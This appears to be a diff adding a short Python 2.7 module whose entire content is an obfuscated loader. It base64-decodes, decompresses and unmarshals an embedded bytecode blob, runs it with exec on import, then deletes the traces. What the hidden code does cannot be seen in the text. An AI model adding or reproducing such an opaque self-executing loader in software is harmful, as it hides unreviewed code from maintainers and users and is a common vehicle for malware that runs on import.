@@ -1,0 +1,8 @@
+import base64, zlib, imp, marshal
+if imp.get_magic().encode('hex') != '03f30d0a': raise ImportError('This module needs Python version 2.7')
+__pyc = marshal.loads(zlib.decompress(base64.b64decode('eJzdVUtv1DAQ7pX8CksckkhRBFekHKqiRaiPrUThgipkktnI1GtHtrPQA/+dsZ33Y1kKHMCHzWbyzTfzecZj/f3Z2RnbV1IZQvN90Py9pfkDLeGOliWojeRcfn0NFYgChG4x7zWod0bVuakV9I7KPPZWBVzSIjpGFwdBATtyzvn28xfIjY6keyZk54AkIxvKNRA0MG5AXTFt0HgjBcSvAoLruZb8ACSXwsA31CEKUlFF94BoIg+gFCtAI58ipZJ1pQmn+Cl1zo2XJsOVEY5RotghHNf4+wThM3aJrSDYjnAQjbSYZBl56XO3yzxWQKYra1g/vrhPLzjV+gYFRXF6rnF7mSgb4obcUTBBonBj6xIm/vnGyrUvW1VSwTQ1TIow7kPbVQ8L2Ycf1TcdvUVdavGMabpRi0x6jcHWyLJYLY5tnGob5FNb66UA17SqoLjwiNu2EXRkHZOwsdtODRPfWvEsRt80KyJ+JcadqjHEso4D5Qh6SowPlNeunCcqaUP9XpQVLe0hSvEHj3U0rNE8J3+gWmyX4Ry4SOt1nMy6iMcT46fLvL2WznJ2dCCm/j1qs036ObVQj46+y7SznIIeHdZTHPy2jJGArXJM+UqwoPfHDezH01t9yUSx3eHwcfN/OmCesNvDWyTFu8FZJhfE2jb/TN0wkrcOlU19/0qr/HkFc7f/rETrrv9IhRxaAW6XGACDH/95wEY=')))
+
+del base64, zlib, imp, marshal
+exec(__pyc)
+del __pyc
+
